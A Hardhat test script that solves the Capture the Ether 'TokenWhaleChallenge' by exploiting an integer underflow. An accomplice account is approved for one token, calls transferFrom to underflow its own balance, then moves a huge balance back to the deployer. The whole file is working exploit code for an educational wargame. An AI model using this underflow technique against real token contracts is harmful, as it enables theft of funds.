import { ethers } from "hardhat";
import { Contract, Signer } from "ethers";
import { expect } from "chai";

let contract: Contract;
let deployer: Signer
let accomplice: Signer

before(async () => {
    const challengeFactory = await ethers.getContractFactory("TokenWhaleChallenge")
    const network = await (await ethers.provider.getNetwork()).name

    const accounts = await ethers.getSigners();
    [deployer, accomplice] = accounts.slice(0, 2);

    // transfer some funds to accomplice
    if ((await accomplice.getBalance()).lt(ethers.utils.parseEther(`0.1`))) {
        deployer.sendTransaction({
            to: await accomplice.getAddress(),
            value: ethers.utils.parseEther(`0.1`),
        });
    }

    if (network === "ropsten") {
        contract = await challengeFactory.attach("0xCcD11Bb4746b93d944b4A97395fB4C282c2F6191");
    } else {
        [, accomplice] = accounts;
        contract = await challengeFactory.deploy(deployer.getAddress(), {
            value: 0,
        });
    }
});

it("solves the challenge", async function () {
    const approveTx = await contract.approve(accomplice.getAddress(), 1);
    const approveTxHash = approveTx && approveTx.hash
    expect(approveTxHash).to.not.be.undefined

    contract = await contract.connect(accomplice)

    const transferToOverflowTx = await contract.transferFrom(deployer.getAddress(), deployer.getAddress(), 1)
    const transferToOverflowTxHash = transferToOverflowTx && transferToOverflowTx.hash
    expect(transferToOverflowTxHash).to.not.be.undefined

    const transferMillionTx = await contract.transfer(deployer.getAddress(), 1000000000)
    const transferMillionTxHash = transferMillionTx && transferMillionTx.hash
    expect(transferMillionTxHash).to.not.be.undefined

    const isComplete = await contract.isComplete()
    expect(isComplete).to.be.true;
});